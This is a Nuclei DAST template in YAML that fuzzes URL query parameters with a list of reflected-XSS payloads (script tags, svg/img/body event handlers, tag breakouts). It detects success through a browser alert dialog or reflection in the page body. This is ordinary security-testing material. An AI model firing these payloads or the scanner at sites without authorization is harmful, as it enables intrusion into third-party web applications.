id: custom-xss-query

info:
  name: Custom XSS - Query Parameters
  author: quintanilha
  severity: medium
  description: Testa XSS em query strings usando payloads efetivos baseados em t√©cnicas reais
  tags: xss,query,dast,headless,custom,quintanilha

variables:
  num: "{{rand_int(10000, 99999)}}"

headless:
  - steps:
      - action: navigate
        args:
          url: "{{BaseURL}}"

      - action: waitdialog
        name: xss_triggered

    payloads:
      xss_payloads:
        - '<0 name="<svg/onload=alert({{num}})>">'
        - "'\"><script>alert({{num}})</script>"
        - "<script>alert({{num}})</script>"
        - "\"><img src=x onerror=alert({{num}})>"
        - "\"><svg onload=alert({{num}})>"
        - "\"><body onload=alert({{num}})>"
        - "<script>alert(1)</script>"
        - "'\">><svg/onload=alert({{num}})>"
        - "\">';/><u>test{{num}}"
        - "\">';/></script><u>test{{num}}"
        - "\">';/></textarea><u>test{{num}}"

    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{xss_payloads}}"

    stop-at-first-match: true

    matchers-condition: or

    matchers:
      - type: dsl
        name: xss-dialog
        dsl:
          - xss_triggered == true

      - type: word
        name: xss-reflected
        part: body
        words:
          - "{{xss_payloads}}"

    extractors:
      - type: dsl
        name: full_url
        dsl:
          - request_url

      - type: kval
        kval:
          - xss_payloads
